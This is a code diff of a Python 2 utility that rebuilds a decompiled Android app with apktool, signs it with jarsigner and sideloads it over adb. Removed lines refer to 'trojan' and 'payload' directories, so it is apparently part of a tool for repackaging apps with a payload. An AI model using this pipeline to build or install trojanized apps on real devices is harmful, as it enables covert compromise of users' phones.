@@ -118,17 +118,24 @@ class Utilities:
 		if '.' not in sub_response:
 			self.print_color('(!) APKTOOL Was not found, INSTALL APKTOOL 2 AND ADD TO PATH ' ,'red')
 			sys.exit()
-		cwd = os.getcwd
-		build_command =  ["apktool","b","/users/rortega/Desktop/ExpenseManage/Android/trojan/base/"]
-		print cwd
-		stringJarSignerCommand=["jarsigner", "-keystore", "./payload/mykey.keystore", "/users/rortega/Desktop", "alias_name", "-sigalg", "MD5withRSA", "-digestalg", "SHA1"]
-		print "[*] EXECUTING APKTOOL BUILD COMMAND..."
+		build_command =  ["apktool","b","./smali/base/"]
+		stringJarSignerCommand=["jarsigner", "-keystore", "./sign/debug.keystore", "./smali/base/dist/base.apk", "signkey", "-sigalg", "MD5withRSA", "-digestalg", "SHA1"]
+		self.print_color("(*) EXECUTING APKTOOL BUILD COMMAND..." ,'blue')
 		p = subprocess.Popen(build_command, stdout=subprocess.PIPE)
 		build_result = p.communicate()[0]
-		print "[*] EXECUTING JARSIGNER COMMAND..."
+		if "Exception" in build_result:
+			self.print_color("Exception:"+build_result ,'red')
+			exit(0)
+		self.print_color("(*)  Enter 'password' to sign..." ,'blue')
 		p = subprocess.Popen(stringJarSignerCommand, stdout=subprocess.PIPE)
 		jarsignerResult = p.communicate()[0]
 		print jarsignerResult
+		self.print_color("(+)  Installing the apk on the device" ,'blue')
+		install_command=["adb", "install", "-r", "./smali/base/dist/base.apk"]
+		p = subprocess.Popen(install_command, stdout=subprocess.PIPE)
+		response = p.communicate()[0]
+		self.print_color("(+) " + response,'blue')
+
 
 
 
